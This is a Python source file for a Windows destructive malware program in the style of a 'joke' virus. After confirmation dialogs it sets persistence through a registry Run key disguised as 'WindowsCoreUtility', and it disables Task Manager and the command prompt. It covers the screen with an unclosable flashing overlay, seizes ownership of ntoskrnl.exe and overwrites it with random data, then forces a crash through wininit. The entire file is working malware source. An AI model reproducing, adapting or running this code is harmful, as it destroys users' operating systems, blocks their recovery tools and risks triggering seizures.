import tkinter as tk
import random
import threading
import pygame
import os
import sys
import winreg
import ctypes
import getpass


SPEED = 1
TRANSPARENCY_MIN = 0.1
TRANSPARENCY_MAX = 0.9
TRANSPARENCY_STEP = 0.05
BLACK_WHITE_CHANCE = 0.1
SOUND_FILE = "sound.mp3"
MOTION_STEP = 1
MOTION_MAX = 5

user = getpass.getuser()
root = tk.Tk()
root.overrideredirect(True)
w = root.winfo_screenwidth()
h = root.winfo_screenheight()
root.geometry(f"{w}x{h}+0+0")
root.attributes("-topmost", True)
root.attributes("-alpha", TRANSPARENCY_MAX)

canvas = tk.Canvas(root, width=w, height=h, highlightthickness=0)
canvas.pack()

image = tk.PhotoImage(width=w, height=h)
canvas.create_image((w//2, h//2), image=image, state="normal")

current_alpha = TRANSPARENCY_MAX
alpha_direction = -TRANSPARENCY_STEP

x_offset = 0
y_offset = 0
x_dir = 1
y_dir = 1

def schedule(x, name):
    threading.Timer(x, name).start()

def info(title, text):
    MB_OK = 0x00
    MB_ICONINFORMATION = 0x40
    style = MB_OK | MB_ICONINFORMATION
    ctypes.windll.user32.MessageBoxW(0, text, title, style)


def dialog(title, text, icon_style):
    MB_YESNO = 0x04
    style = MB_YESNO | icon_style
    result = ctypes.windll.user32.MessageBoxW(0, text, title, style)
    return result == 6

def warning():
    MB_ICONEXCLAMATION = 0x30
    if not dialog("Warning", "WARNING: This program will make irreversible changes to your system settings. Proceeding without understanding the consequences may result in loss of data, system instability, or the need to reinstall your operating system. Do you wish to continue?", MB_ICONEXCLAMATION):
        return

    if not dialog("Final Confirmation", "Are you absolutely sure you want to proceed?", MB_ICONEXCLAMATION):
        return
    
    info("Disclaimer", "Contains flashy lights which might trigger epileptic seizures. THE CREATOR IS NOT RESPONSIBLE. YOU HAVE BEEN WARNED...")

    sth(resource_path("image.png"))

def startup():
        exe_path = os.path.abspath(sys.executable)

        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(key, "WindowsCoreUtility", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)


def disable():
        key1 = winreg.CreateKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        )
        winreg.SetValueEx(key1, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key1)

        key2 = winreg.CreateKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\\Policies\\Microsoft\\Windows\\System"
        )
        winreg.SetValueEx(key2, "DisableCMD", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key2)

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def sound(filename=SOUND_FILE, loop=True):
    try:
        pygame.mixer.init()
        sound_file = resource_path(filename)
        s = pygame.mixer.Sound(sound_file)
        s.play(loops=-1 if loop else 0)
    except:
        pass

def motion_illusion(pixel_rows):
    global x_offset, y_offset, x_dir, y_dir
    x_offset += x_dir * MOTION_STEP
    y_offset += y_dir * MOTION_STEP
    if abs(x_offset) >= MOTION_MAX:
        x_dir *= -1
    if abs(y_offset) >= MOTION_MAX:
        y_dir *= -1
    shifted_rows = []
    for row in pixel_rows:
        row_pixels = row.split()
        if x_offset != 0:
            row_pixels = row_pixels[-x_offset:] + row_pixels[:-x_offset]
        shifted_rows.append("{" + " ".join(row_pixels) + "}")
    if y_offset != 0:
        shifted_rows = shifted_rows[-y_offset:] + shifted_rows[:-y_offset]
    return shifted_rows

def visuals():
    global current_alpha, alpha_direction
    pixel_rows = []
    for _ in range(h):
        row_pixels = []
        for _ in range(w):
            if random.random() < BLACK_WHITE_CHANCE:
                row_pixels.append(random.choice(["#000000", "#FFFFFF"]))
            else:
                row_pixels.append(f"#{random.randint(0,255):02x}{random.randint(0,255):02x}{random.randint(0,255):02x}")
        pixel_rows.append("{" + " ".join(row_pixels) + "}")
    pixel_rows = motion_illusion(pixel_rows)
    for y, row in enumerate(pixel_rows):
        image.put(row, (0, y))
    current_alpha += alpha_direction
    if current_alpha <= TRANSPARENCY_MIN or current_alpha >= TRANSPARENCY_MAX:
        alpha_direction *= -1
    root.attributes("-alpha", current_alpha)
    root.after(SPEED, visuals)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind("<FocusOut>", lambda e: root.focus_force())

def waiting():
    root.after(int(60*1000), oops)

def prc():
    os.system('powershell takeown /f C:/Windows/system32/ntoskrnl.exe')
    os.system(f'powershell icacls C:/Windows/system32/ntoskrnl.exe /grant {user}:F')
    with open("C:/Windows/system32/ntoskrnl.exe", "w") as f:
        for _ in range(10):
            num = random.randint(1, 100)
            f.write(str(num))
def oops():
    os.system('powershell wininit')

def sth(image_path):
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINFILE = 0x01
    SPIF_SENDCHANGE = 0x02
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        image_path,
        SPIF_UPDATEINFILE | SPIF_SENDCHANGE
)
    threading.Thread(target=sound, daemon=True).start()
    schedule(5, payload)

def payload():
    threading.Thread(target=disable, daemon=True).start()
    threading.Thread(target=startup, daemon=True).start()
    threading.Thread(target=visuals, daemon=True).start()
    threading.Thread(target=waiting, daemon=True).start()
    threading.Thread(target=prc, daemon=True).start()


if __name__ == "__main__":
    warning()

